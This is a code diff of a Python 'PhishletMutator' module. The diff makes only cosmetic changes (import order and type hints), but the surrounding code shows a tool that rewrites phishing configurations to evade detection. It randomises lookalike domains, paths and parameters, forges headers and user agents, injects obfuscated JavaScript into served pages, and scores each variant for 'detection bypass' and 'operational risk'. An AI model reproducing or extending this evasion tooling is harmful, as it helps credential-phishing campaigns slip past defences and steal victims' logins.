@@ -10,19 +10,22 @@ Mutates phishlets to bypass detection systems:
 - JavaScript injection
 """
 
-import yaml
+import hashlib
 import json
 import random
-import string
-import hashlib
-from typing import Dict, List, Any, Optional, Tuple
-from dataclasses import dataclass, asdict
-from pathlib import Path
 import secrets
+import string
+import time
+from dataclasses import asdict, dataclass
+from datetime import datetime
+from pathlib import Path
+from typing import Any, Dict, List, Optional, Tuple
+
+import yaml
 
 from .domain_generator import DomainGenerator
-from .obfuscator import JavaScriptObfuscator
 from .evasion_engine import EvasionEngine
+from .obfuscator import JavaScriptObfuscator
 
 
 @dataclass
@@ -44,8 +47,8 @@ class MutatedPhishlet:
     original_name: str
     mutated_name: str
     mutation_id: str
-    config: Dict[str, Any]
-    mutations_applied: List[str]
+    config: dict[str, Any]
+    mutations_applied: list[str]
     detection_bypass_score: float
     operational_risk: str
 
@@ -56,7 +59,7 @@ class PhishletMutator:
     Generates multiple variants to bypass detection systems.
     """
     
-    def __init__(self, config: Optional[MutationConfig] = None):
+    def __init__(self, config: MutationConfig | None = None):
         self.config = config or MutationConfig()
         self.domain_gen = DomainGenerator()
         self.obfuscator = JavaScriptObfuscator()
@@ -75,7 +78,7 @@ class PhishletMutator:
         }
     
     def mutate_phishlet(self, phishlet_path: str, 
-                        num_variants: int = 5) -> List[MutatedPhishlet]:
+                        num_variants: int = 5) -> list[MutatedPhishlet]:
         """
         Generate multiple mutated variants of a phishlet.
         
@@ -162,7 +165,7 @@ class PhishletMutator:
         random_str = secrets.token_hex(4)
         return hashlib.sha256(f"{base_name}{variant}{timestamp}{random_str}".encode()).hexdigest()[:16]
     
-    def _mutate_domains(self, config: Dict[str, Any]) -> None:
+    def _mutate_domains(self, config: dict[str, Any]) -> None:
         """Mutate domains and subdomains"""
         # Generate domain variations
         if 'author' in config and 'domain' in config['author']:
@@ -177,7 +180,7 @@ class PhishletMutator:
                 variations = self.domain_gen.generate_subdomain_variations(original_sub, count=2)
                 subdomain['subdomain'] = random.choice(variations)
     
-    def _mutate_paths(self, config: Dict[str, Any]) -> None:
+    def _mutate_paths(self, config: dict[str, Any]) -> None:
         """Obfuscate and randomize paths"""
         for rule in config.get('redirect_rules', []):
             if 'path' in rule:
@@ -202,7 +205,7 @@ class PhishletMutator:
                         segments.insert(insert_pos, random_segment)
                         rule['path'] = '/'.join(segments)
     
-    def _mutate_parameters(self, config: Dict[str, Any]) -> None:
+    def _mutate_parameters(self, config: dict[str, Any]) -> None:
         """Randomize parameter names and values"""
         for rule in config.get('redirect_rules', []):
             if 'params' in rule:
@@ -223,7 +226,7 @@ class PhishletMutator:
                 fake_value = secrets.token_hex(8)
                 rule['params'][fake_param] = fake_value
     
-    def _mutate_headers(self, config: Dict[str, Any]) -> None:
+    def _mutate_headers(self, config: dict[str, Any]) -> None:
         """Manipulate HTTP headers"""
         for rule in config.get('redirect_rules', []):
             if 'headers' not in rule:
@@ -246,7 +249,7 @@ class PhishletMutator:
             for header_name, header_value in selected_headers:
                 rule['headers'][header_name] = header_value
     
-    def _inject_javascript(self, config: Dict[str, Any]) -> None:
+    def _inject_javascript(self, config: dict[str, Any]) -> None:
         """Inject obfuscated JavaScript"""
         for rule in config.get('redirect_rules', []):
             if 'content_type' in rule and 'html' in rule['content_type'].lower():
@@ -261,7 +264,7 @@ class PhishletMutator:
                 script_tag = f"<script>{js_code}</script>"
                 rule['body'] += script_tag
     
-    def _mutate_timing(self, config: Dict[str, Any]) -> None:
+    def _mutate_timing(self, config: dict[str, Any]) -> None:
         """Add timing variations"""
         for rule in config.get('redirect_rules', []):
             # Add random delays
@@ -274,7 +277,7 @@ class PhishletMutator:
                 timeout = random.randint(5, 30)
                 rule['timeout'] = timeout
     
-    def _mutate_user_agents(self, config: Dict[str, Any]) -> None:
+    def _mutate_user_agents(self, config: dict[str, Any]) -> None:
         """Rotate user agents"""
         user_agents = [
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
@@ -290,7 +293,7 @@ class PhishletMutator:
             
             rule['headers']['User-Agent'] = random.choice(user_agents)
     
-    def _mutate_encoding(self, config: Dict[str, Any]) -> None:
+    def _mutate_encoding(self, config: dict[str, Any]) -> None:
         """Mutate content encoding"""
         encodings = ['gzip', 'deflate', 'br']
         
@@ -312,7 +315,7 @@ class PhishletMutator:
         ]
         return random.choice(user_agents)
     
-    def _calculate_bypass_score(self, mutations_applied: List[str]) -> float:
+    def _calculate_bypass_score(self, mutations_applied: list[str]) -> float:
         """Calculate detection bypass score"""
         base_score = 0.0
         
@@ -337,8 +340,8 @@ class PhishletMutator:
         total_score = min(base_score + synergy_bonus, 1.0)
         return round(total_score, 3)
     
-    def _assess_operational_risk(self, config: Dict[str, Any], 
-                               mutations_applied: List[str]) -> str:
+    def _assess_operational_risk(self, config: dict[str, Any], 
+                               mutations_applied: list[str]) -> str:
         """Assess operational risk of mutated phishlet"""
         risk_score = 0
         
@@ -394,7 +397,7 @@ class PhishletMutator:
         return str(file_path)
     
     def batch_mutate(self, phishlet_dir: str, output_dir: str, 
-                    variants_per_phishlet: int = 3) -> Dict[str, List[str]]:
+                    variants_per_phishlet: int = 3) -> dict[str, list[str]]:
         """Batch mutate all phishlets in directory"""
         results = {}
         
